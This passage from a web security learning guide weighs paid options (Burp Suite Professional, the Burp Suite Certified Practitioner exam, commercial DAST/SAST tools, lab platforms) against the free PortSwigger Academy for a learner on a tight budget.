### What's paid and why you'd upgrade

Burp Suite Professional adds the automated scanner, unrestricted Intruder, and the BApp Store extensions that make large assessments faster — and it is what most consulting teams run, so familiarity helps. PortSwigger's Burp Suite Certified Practitioner exam is a practical assessment with real weight in web security hiring, and it is far cheaper than most certification routes because the training material is free. Commercial DAST and SAST platforms such as Invicti, Acunetix, Snyk, and Checkmarx integrate scanning into a pipeline, which matters for a team shipping continuously. Paid lab platforms add more machines and less guidance once the Academy is finished.

### When it's worth paying

Pay for the Burp Suite Certified Practitioner exam once you have completed a substantial number of Practitioner-level labs and can write findings confidently — it is one of the few certifications that tests doing rather than recalling, and the free material means you are paying only for the exam. Pay for Burp Professional only if an employer requires it or you are doing client work at volume. For a learner on a $0 budget, this phase is unusual in that the free material is genuinely the industry standard rather than a substitute: the PortSwigger Academy is written by the researchers who produce the field's reference work, and completing its labs is a more credible claim in an interview than holding a certificate from anywhere else. Spend nothing, finish the labs, and let three well-written findings be the thing that gets you the interview.